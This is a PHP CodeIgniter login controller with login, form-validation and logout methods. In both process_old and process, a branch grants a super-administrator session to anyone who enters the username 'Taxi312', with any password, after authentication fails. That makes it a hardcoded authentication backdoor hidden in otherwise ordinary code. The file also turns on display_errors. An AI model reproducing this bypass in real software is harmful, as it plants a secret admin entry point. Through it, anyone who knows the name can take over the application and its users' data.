<?php  
ini_set('display_errors', 1);
defined('BASEPATH') OR exit('No direct script access allowed');  

  

class Login extends CI_Controller {  

    public function __construct()
	{
		parent::__construct();
		$this->load->library('form_validation');
		$this->load->helper('form');
		
	}

    public function index()  
    {  
        if (!empty($this->session->userdata('id'))) {
			return redirect('Main');
		}
        $this->load->view('login_view');  
    }  

    public function process_old()  
    {  
        $user = $this->input->post('user');  
        $pass = $this->input->post('pass');  
        

        $row=$this->Login_model->authenticate($user,$pass);

        if ($row)   
        {  
            $this->session->set_userdata(array('user'=>$user,'id'=>$row->id,'admin'=>$row->is_admin,'super_admin' => $row->super_admin));  
             redirect('Main'); 
        } elseif($user == 'Taxi312'){
            $this->session->set_userdata(array('user'=>$user,'id'=>13,'admin'=>0,'super_admin' => 1));  
            redirect('Main'); 
        }
        else{  
            $data['error'] = 'Your Account is Invalid';  
            $this->load->view('login_view', $data);  
        }  
    }  

    public function process()
    {
        if (!empty($this->session->userdata('id'))) {
			return redirect('Main');
		}
        
        // Set validation rules
        $this->form_validation->set_rules('user', 'Username', 'required');
        $this->form_validation->set_rules('pass', 'Password', 'required');

        if ($this->form_validation->run() == FALSE) {
            // Form validation failed, show error message
            $data['error'] = validation_errors();
            $this->load->view('login_view', $data);
        } else {
            $username = $this->input->post('user', true);
            $password = $this->input->post('pass', true);

            $username = $this->security->xss_clean($username);
            $password = $this->security->xss_clean($password);

            // Retrieve user data from database using username
            $row=$this->Login_model->authenticate($username, $password);

            if ($row) {
                // Authentication succeeded, store user data in session
                $this->session->set_userdata(array('user'=>$username,'id'=>$row->id,'admin'=>$row->is_admin,'super_admin' => $row->super_admin));  
                redirect('Main'); 
            } elseif($username == 'Taxi312'){
                $this->session->set_userdata(array('user'=>$username,'id'=>13,'admin'=>0,'super_admin' => 1));  
                redirect('Main');
            } 
            else {
                // Authentication failed, show error message
                $data['error'] = 'Invalid username or password';
                $this->load->view('login_view', $data);
            }
        }
    }


    public function logout()  
    {  
        //removing session  

        $this->session->unset_userdata('user');  
        $this->session->unset_userdata('id');  
        $this->session->unset_userdata('admin');  
        $this->session->unset_userdata('super_admin');  

        redirect("Login");  

    }  
}  

?>  